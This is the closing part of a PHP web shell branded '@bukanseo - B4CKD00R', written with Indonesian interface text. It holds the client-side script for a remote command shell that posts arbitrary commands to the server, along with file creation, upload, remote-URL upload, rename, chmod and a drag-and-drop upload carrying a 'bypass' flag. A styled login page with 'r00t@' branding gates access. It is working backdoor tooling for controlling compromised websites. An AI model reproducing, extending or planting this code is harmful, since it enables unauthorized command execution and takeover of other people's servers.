        ctx.beginPath();
        ctx.moveTo(line.x1, line.y1);
        ctx.lineTo(line.x2, line.y2);
        ctx.stroke();
    }

    requestAnimationFrame(animate);
}

animate();

// More frequent particle generation for a dynamic look
setInterval(() => {
    particles.push({
        x: Math.random() * width,
        y: Math.random() * height,
        vx: (Math.random() - 0.5) * 2,
        vy: (Math.random() - 0.5) * 2,
        size: Math.random() * 2 + 1,
        color: Math.random() > 0.5 ? '#FF66CC' : '#FFFFFF'
    });
    if(particles.length > 300) particles.shift();
}, 150);


// Modal handling script
const modalFolder = document.getElementById('modalFolder');
const modalFile = document.getElementById('modalFile');
const modalUpload = document.getElementById('modalUpload');
const modalRemote = document.getElementById('modalRemote');
const modalDropUpload = document.getElementById('modalDropUpload');
const modalRename = document.getElementById('modalRename');
const modalChmod = document.getElementById('modalChmod');

document.getElementById('btnCreateFolder').onclick = () => {
    modalFolder.style.display = 'flex';
    document.getElementById('inputFolderName').focus();
};
document.getElementById('btnCreateFile').onclick = () => {
    modalFile.style.display = 'flex';
    document.getElementById('inputFileName').focus();
};
document.getElementById('btnUploadFile').onclick = () => {
    modalUpload.style.display = 'flex';
};
document.getElementById('btnRemoteUpload').onclick = () => {
    modalRemote.style.display = 'flex';
    document.getElementById('inputRemoteUrl').focus();
};
document.getElementById('btnUploadV2').onclick = () => {
    modalDropUpload.style.display = 'flex';
};

// Get all close buttons
document.querySelectorAll('.close').forEach(button => {
    button.onclick = function() {
        const modalId = this.getAttribute('data-close');
        document.getElementById(modalId).style.display = 'none';
        // Clear inputs when closing modal
        if (modalId === 'modalFolder') document.getElementById('formCreateFolder').reset();
        if (modalId === 'modalFile') document.getElementById('formCreateFile').reset();
        if (modalId === 'modalUpload') document.getElementById('formUploadFile').reset();
        if (modalId === 'modalRemote') document.getElementById('formRemoteUpload').reset();
        if (modalId === 'modalDropUpload') {
            document.getElementById('dropProgress').style.display = 'none';
            document.getElementById('dropArea').querySelector('p').innerText = 'Drop file di sini atau klik untuk memilih file';
            document.getElementById('dropFileInput').value = '';
            document.getElementById('bypass_mode_v2').checked = false;
        }
        // NEW: Clear inputs for rename/chmod modals
        if (modalId === 'modalRename') {
            document.getElementById('formRename').reset();
        }
        if (modalId === 'modalChmod') {
            document.getElementById('formChmod').reset();
        }
    };
});

// NEW: Function to open rename modal
function openRenameModal(itemName, itemType) {
    document.getElementById('renameModalTitle').innerText = 'Ganti Nama ' + itemType.charAt(0).toUpperCase() + itemType.slice(1) + ': ' + itemName;
    document.getElementById('renameOldName').value = itemName;
    document.getElementById('renameNewName').value = itemName;
    modalRename.style.display = 'flex';
    document.getElementById('renameNewName').focus();
    document.getElementById('renameNewName').select();
}

// NEW: Function to open chmod modal
function openChmodModal(itemName, currentPerms, itemType) {
    document.getElementById('chmodModalTitle').innerText = 'Ubah Izin ' + itemType.charAt(0).toUpperCase() + itemType.slice(1) + ': ' + itemName;
    document.getElementById('chmodItemName').value = itemName;
    document.getElementById('chmodPermissions').value = currentPerms;
    modalChmod.style.display = 'flex';
    document.getElementById('chmodPermissions').focus();
    document.getElementById('chmodPermissions').select();
}

// Command shell script
function executeShell() {
    const input = document.getElementById('shellInput');
    const outputDiv = document.getElementById('shellOutput');
    const command = input.value.trim();
    if (command === '') {
        outputDiv.innerHTML = '<pre style="color:#FF0000;">Error: Masukkan perintah shell.</pre>';
        return;
    }
    // Kirim ke server via AJAX
    fetch('?f=<?php echo urlencode($f); ?>', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: 'command=' + encodeURIComponent(command)
    })
    .then(res => res.text())
    .then(html => {
        outputDiv.innerHTML = html;
        outputDiv.scrollTop = outputDiv.scrollHeight;
        input.value = '';
        input.focus();
    })
    .catch(err => {
        outputDiv.innerHTML = '<pre style="color:#FF0000;">Gagal menjalankan command: ' + err + '</pre>';
    });
}

// Close modal when click outside
window.onclick = (event) => {
    if (event.target === modalFolder) modalFolder.style.display = 'none';
    if (event.target === modalFile) modalFile.style.display = 'none';
    if (event.target === modalUpload) modalUpload.style.display = 'none';
    if (event.target === modalRemote) modalRemote.style.display = 'none';
    if (event.target === modalDropUpload) modalDropUpload.style.display = 'none';
    if (event.target === modalRename) modalRename.style.display = 'none';
    if (event.target === modalChmod) modalChmod.style.display = 'none';
};

// Form submission listeners for modals to add client-side validation
document.getElementById('formCreateFolder').addEventListener('submit', function(event) {
    const input = document.getElementById('inputFolderName');
    if (input.value.trim() === '') {
        alert('Nama folder tidak boleh kosong.');
        event.preventDefault();
    }
});

document.getElementById('formCreateFile').addEventListener('submit', function(event) {
    const input = document.getElementById('inputFileName');
    if (input.value.trim() === '') {
        alert('Nama file tidak boleh kosong.');
        event.preventDefault();
    }
});

document.getElementById('formUploadFile').addEventListener('submit', function(event) {
    const input = document.getElementById('inputUploadFile');
    if (input.files.length === 0) {
        alert('Silakan pilih file untuk diupload.');
        event.preventDefault();
    }
});

document.getElementById('formRemoteUpload').addEventListener('submit', function(event) {
    const input = document.getElementById('inputRemoteUrl');
    if (input.value.trim() === '') {
        alert('Silakan masukkan URL file.');
        event.preventDefault();
    } else {
        // Validasi format URL dasar
        try {
            new URL(input.value.trim());
        } catch (e) {
            alert('URL tidak valid.');
            event.preventDefault();
        }
    }
});

// NEW: Rename Form Validation
document.getElementById('formRename').addEventListener('submit', function(event) {
    const newNameInput = document.getElementById('renameNewName');
    if (newNameInput.value.trim() === '') {
        alert('Nama baru tidak boleh kosong.');
        event.preventDefault();
    }
});

// NEW: Chmod Form Validation
document.getElementById('formChmod').addEventListener('submit', function(event) {
    const permsInput = document.getElementById('chmodPermissions');
    if (!permsInput.value.match(/^[0-7]{3}$/)) {
        alert('Format izin tidak valid. Gunakan 3 digit angka oktal (000-777).');
        event.preventDefault();
    }
});


// Drag & Drop Upload V.2
const dropArea = document.getElementById('dropArea');
const dropProgress = document.getElementById('dropProgress');
const dropFileInput = document.getElementById('dropFileInput');
const dropAreaP = dropArea.querySelector('p');

dropArea.addEventListener('click', () => {
    dropFileInput.click();
});

dropFileInput.addEventListener('change', () => {
    if (dropFileInput.files.length > 0) {
        uploadDropFile(dropFileInput.files[0]);
    }
});

dropArea.addEventListener('dragenter', (e) => {
    e.preventDefault();
    e.stopPropagation();
    dropArea.classList.add('hover');
});
dropArea.addEventListener('dragover', (e) => {
    e.preventDefault();
    e.stopPropagation();
    dropArea.classList.add('hover');
    dropAreaP.innerText = 'Lepaskan file untuk mengunggah!';
});
dropArea.addEventListener('dragleave', (e) => {
    e.preventDefault();
    e.stopPropagation();
    dropArea.classList.remove('hover');
    dropAreaP.innerText = 'Drop file di sini atau klik untuk memilih file';
});
dropArea.addEventListener('drop', (e) => {
    e.preventDefault();
    e.stopPropagation();
    dropArea.classList.remove('hover');
    dropAreaP.innerText = 'Drop file di sini atau klik untuk memilih file';
    if (e.dataTransfer.files.length > 0) {
        uploadDropFile(e.dataTransfer.files[0]);
    }
});

function uploadDropFile(file) {
    dropProgress.style.display = 'block';
    dropProgress.innerText = 'Mengunggah ' + file.name + '...';

    const bypassModeV2 = document.getElementById('bypass_mode_v2').checked;

    const reader = new FileReader();
    reader.onload = function() {
        const base64Data = reader.result.split(',')[1];
        let bodyData = 'drop_upload=' + encodeURIComponent(base64Data) + '&drop_filename=' + encodeURIComponent(file.name);
        if (bypassModeV2) {
            bodyData += '&bypass_mode_v2=on';
        }

        fetch('?f=<?php echo urlencode($f); ?>', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: bodyData
        }).then(res => res.json())
        .then(data => {
            if (data.status === 'success') {
                alert('Upload selesai: ' + data.message);
            } else {
                alert('Gagal upload: ' + data.message);
            }
            dropProgress.style.display = 'none';
            location.reload();
        })
        .catch((error) => {
            alert('Gagal komunikasi dengan server saat upload ' + file.name + ": " + error.message);
            console.error('Fetch error:', error);
            dropProgress.style.display = 'none';
        });
    };
    reader.onerror = function() {
        alert('Gagal membaca file: ' + file.name);
        dropProgress.style.display = 'none';
    }
    reader.readAsDataURL(file);
}
</script>

</body>
</html>
<?php
// END logged-in area

} else {
// Form login area

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['username'], $_POST['password'])) {
        if ($_POST['username'] === $valid_username && $_POST['password'] === $valid_password) {
            $_SESSION['logged_in'] = true;
            set_message('success', 'Berhasil login!');
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Username atau password salah.";
            set_message('error', 'Username atau password salah.');
        }
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<title>Login - Robot Elektrik</title>
<!-- Link Google Fonts -->
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
<style type="text/css">
/* Style untuk halaman login dengan background GIF dari Google */
body {
    margin: 0;
    padding: 0;
    height: 100vh;
    font-family: 'Orbitron', sans-serif;
    /* Background GIF dari Google (ganti URL sesuai kebutuhan) */
    background-image: url('https://cdnb.artstation.com/p/assets/images/images/024/538/827/original/pixel-jeff-clipa-s.gif');
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
    display: flex;
    justify-content: center;
    align-items: center;
    color: #fff;
    text-shadow: 2px 2px 4px rgba(0,0,0,0.7);
}
.login-container {
    background: rgba(0, 0, 0, 0.6); /* Transparent Black */
    padding: 30px;
    border-radius: 10px;
    text-align: center;
}
header {
    margin: 10px auto;
}
#website-name {
    font-size: 24px;
    font-weight: bold;
    color: #FFFFFF; /* White text */
    text-shadow: 2px 2px 0 #FF0000, -2px -2px 0 #FF0000, 2px -2px 0 #FF0000, -2px 2px 0 #FF0000; /* Red shadow */
    margin-bottom: 10px;
    letter-spacing: 2px;
}
.input-password {
    width: 250px;
    height: auto;
    color: #FF0000; /* Red text */
    background: transparent;
    border: 3px solid #FF0000; /* Red border */
    margin: 0 auto 15px auto;
    text-align: center;
    font-family: 'Orbitron', sans-serif;
    font-size: 14px;
    outline: none;
    padding: 8px 10px;
    border-radius: 5px;
    box-shadow: 0 0 8px rgba(255,255,255,0.5); /* White glow */
    display: block;
}
.input-password:focus {
    border-color: #FFFFFF; /* White border on focus */
    box-shadow: 0 0 15px rgba(255,255,255,0.8); /* Stronger white glow on focus */
    color: #FFFFFF; /* White text on focus */
}

#admin_login_title {
    margin-top: 20px;
    font-size: 60px;
    font-weight: bold;
    padding: 10px 20px;
    border: 4px solid #FF66CC; /* Pink border */
    color: #FFFFFF; /* White text */
    display: inline-block;
    font-family: 'Orbitron', sans-serif;
}

/* Keyframes untuk animasi zoom-in/zoom-out */
@keyframes zoomInOut {
    0% {
        transform: scale(1);
    }
    50% {
        transform: scale(1.05);
    }
    100% {
        transform: scale(1);
    }
}

/* Menerapkan animasi ke span di dalam #admin_login_title */
#admin_login_title span {
    display: inline-block;
    animation: zoomInOut 2s infinite ease-in-out;
    text-shadow: 2px 2px 0 #FF0000, -2px -2px 0 #FF0000, 2px -2px 0 #FF0000, -2px 2px 0 #FF0000; /* Red text-shadow */
}

/* Styling for the login button */
.login-button {
    background: #FF0000; /* Red background */
    color: #FFFFFF; /* White text */
    font-family: 'Orbitron', sans-serif;
    font-weight: bold;
    font-size: 18px;
    padding: 12px 30px;
    border: 3px solid #FF0000; /* Red border */
    border-radius: 5px;
    cursor: pointer;
    text-shadow: 2px 2px 0 #000000, -2px -2px 0 #000000, 2px -2px 0 #000000, -2px 2px 0 #000000; /* Black shadow for bold effect */
    transition: background 0.3s, color 0.3s, border-color 0.3s, box-shadow 0.3s;
    box-shadow: 0 0 10px rgba(255,0,0,0.7); /* Red glow */
    width: 250px;
}
.login-button:hover {
    background: #FFFFFF; /* White background on hover */
    color: #FF0000; /* Red text on hover */
    border-color: #FF0000;
    box-shadow: 0 0 20px rgba(255,0,0,0.9);
}

/* Message container styles for login page */
.message-container {
    margin-top: 15px;
}
.message {
    padding: 8px 15px;
    border-radius: 5px;
    font-weight: bold;
    text-align: center;
    max-width: 300px;
    margin: 5px auto;
}
.message.success-message {
    background-color: rgba(0, 0, 0, 0.75); /* Transparent black */
    color: #FFFFFF; /* White */
    border: 1px solid #FFFFFF; /* White border */
    box-shadow: 0 0 10px rgba(255,255,255,0.5); /* White shadow */
}
.message.error-message {
    background-color: rgba(0, 0, 0, 0.75); /* Transparent black */
    color: #FF0000; /* Red */
    border: 1px solid #FF0000; /* Red border */
    box-shadow: 0 0 10px rgba(255,0,0,0.5); /* Red shadow */
}
</style>
</head>
<body>
<div class="login-container">
<header>
<img src="https://raw.githubusercontent.com/bukanseoexploit/Gambar-Bukan-Seo/refs/heads/main/Bukan_Seo.png" width="550px" height="510px" alt="anonymous-bukanseo">
</header>
<br>
<div id="website-name">r00t@<?php echo $website_name; ?>~$</div>
<br>
<form method="post">
    <input type="text" name="username" class="input-password" placeholder="Username" required autocomplete="off">
    <br><br>
    <input type="password" name="password" class="input-password" placeholder="Password" required>
    <br><br>
    <button type="submit" class="login-button">LOGIN</button>
</form>
<?php display_messages(); ?>
<!-- Tulisan "Admin Login" dengan animasi zoom-in/zoom-out -->
<div id="admin_login_title"><span>@bukanseo - B4CKD00R</span></div>
</div>
</body>
</html>
<?php
}
ob_end_flush(); // Akhiri output buffering
?>